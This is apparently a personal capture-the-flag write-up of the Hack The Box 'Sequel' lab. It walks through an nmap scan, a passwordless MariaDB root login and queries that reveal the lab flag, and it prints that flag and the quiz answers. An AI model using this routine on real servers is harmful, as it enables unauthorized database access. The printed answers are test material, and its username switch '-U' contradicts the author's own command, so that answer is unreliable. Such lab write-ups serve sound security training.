---
title: "[HTB] Sequel"
author: "Wook Lee"
date: "2024-07-12"
tags: ["Hack The Box"]
---

#### During our scan, which port do we find serving MySQL?

```
3306
```

```shell
┌─[us-starting-point-vip-1-dhcp]─[10.10.14.28]─[leewookb@htb-0x7zvm1bat]─[~]
└──╼ [★]$ nmap -sC -sV 10.129.50.55 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-11 23:56 CDT
Nmap scan report for 10.129.50.55
Host is up (0.0084s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 66
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolOld, Support41Auth, SupportsTransactions, SupportsCompression, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, FoundRows, SupportsLoadDataLocal, ODBCClient, DontAllowDatabaseTableColumn, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: 6'\|}}|xdny7D0ay_OOz
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 204.84 seconds
```

<br>

#### What community-developed MySQL version is the target running?

```
MariaDB
```

```shell
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 66
|   Capabilities flags: 63486
```

<br>

#### When using the MySQL command line client, what switch do we need to use in order to specify a login username?

```
-U
```

The option could be found by the `mysql --help` command

![alt text](image.png#center)

<br>

#### Which username allows us to log into this MariaDB instance without providing a password?

```
root
```

I attempted to login as root without password and it was accepted.

`mysql -h {target IP address} -u {username}`

```shell
┌─[us-starting-point-vip-1-dhcp]─[10.10.14.28]─[leewookb@htb-0x7zvm1bat]─[~]
└──╼ [★]$ mysql -h 10.129.50.55 -u root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 74
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

<br>

#### In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?

```
*
```

`*` the asterisk symbol is used to display everything (all columns) inside a table.

For example, `SELECT * FROM {table_name}`

<br>

#### In SQL, what symbol do we need to end each query with?

```
;
```

in SQL, we specify `;`, the semicolon to end each query, just like we end every line with the semicolon when programming in Javascript.

<br>

#### There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?

```
htb
```

`SHOW DATABSES` command listed all the databases in the MySQL instance and `htb` is the unique one to the host.

```sql
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

<br>

#### Submit root flag

```
7b4bec00d1a39e3dd4e021ec3d915da8
```

since I know the database that I'm interested in is the `htb` database, I ran `use htb` command to change the database to htb.
Then listed the tables belonged to the db by `show tables`

```SQL
MariaDB [(none)]> use htb
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.009 sec)
```

<br>

To list everything in the config table, I ran `show * from config` and there was the flag.
<br>

```sql
MariaDB [htb]> select * from config;
+----+-----------------------+----------------------------------+
| id | name | value |
+----+-----------------------+----------------------------------+
| 1 | timeout | 60s |
| 2 | security | default |
| 3 | auto_logon | false |
| 4 | max_size | 2M |
| 5 | flag | 7b4bec00d1a39e3dd4e021ec3d915da8 |
| 6 | enable_uploads | false |
| 7 | authentication_method | radius |
+----+-----------------------+----------------------------------+
7 rows in set (0.009 sec)
```

<br>

![alt text](image-1.png#center)
